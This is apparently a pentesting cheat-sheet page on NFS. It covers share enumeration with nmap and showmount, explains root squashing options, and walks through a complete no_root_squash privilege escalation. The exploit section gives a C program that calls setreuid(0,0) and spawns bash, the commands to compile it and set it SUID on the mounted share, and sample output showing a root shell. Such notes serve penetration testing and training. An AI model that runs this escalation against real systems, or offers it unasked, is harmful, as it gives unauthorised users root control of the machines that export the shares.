---
title: "NFS"
---

# 📁 NFS (Network File System)

> NFS allows sharing directories over a network. In some misconfigured cases (especially with `no_root_squash`), an attacker can gain root privileges remotely.

## 📚 Resources

- [Hacktricks NFS Exploit](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.html)
- [Exploit NFS](https://www.hvs-consulting.de/en/blog/nfs-security-identifying-and-exploiting-misconfigurations)

### Tools

- [NfSpy - Remote Exploit](https://github.com/bonsaiviking/NfSpy)

## 🔎 Enumeration

Basic commands to discover and list available NFS shares on a target:

```bash
# Enum service
nmap -p 2049 --script=nfs* <target-ip>

# List exported shares on the target
showmount -e <target-ip>

# Mount the export manually
sudo mount -t nfs <target-ip>:/shared/folder /mnt/nfs

# Use NFSv3 and disable file locking
sudo mount -t nfs -o nolock,nfsvers=3 $IP:/shared/folder /mnt/nfs
```

## 🔍 Squashing

The **squash** mechanism controls how NFS handles user permissions. This is where the main vulnerability lies.

- `all_squash`: Maps all UID/GID to `nobody` (UID 65534). No real users are recognized.
- `root_squash` _(default)_: Only the `root` user (UID 0) is mapped to `nobody`. All other UID/GIDs are respected.
- `no_root_squash`: No mapping is performed, **not even for root**. This mode is dangerous as it allows a remote root user to keep their privileges.

### ⚙️ Config File

NFS exports are defined in `/etc/exports`.

```txt
/opt/shared/ 127.0.0.1(insecure,rw,sync,no_subtree_check,no_root_squash)
```

This configuration is vulnerable because it uses `no_root_squash`.

## 💥 Exploit

When an NFS export is mounted with `no_root_squash`, an attacker can:

1. Mount the NFS share as root on their machine:

```bash
# mount nfs share
sudo mount -t nfs $IP:/opt/shared /mnt/shared
```

2. Create a SUID root binary inside this folder:

```c
// exploit.c
#include <stdlib.h>
#include <unistd.h>

int main() {
  setreuid(0, 0);
  system("/bin/bash");
  return 0;
}
```

```bash
gcc exploit.c -o exploit -static

mv exploit /mnt/exploit_nfs/
chmod +x /mnt/exploit_nfs/exploit
chmod +s /mnt/exploit_nfs/exploit
```

3. Run the binary on the vulnerable machine as any user:

```bash
./exploit
```

Result:

```bash
> id
uid=0(root) gid=0(root) groups=0(root)
```
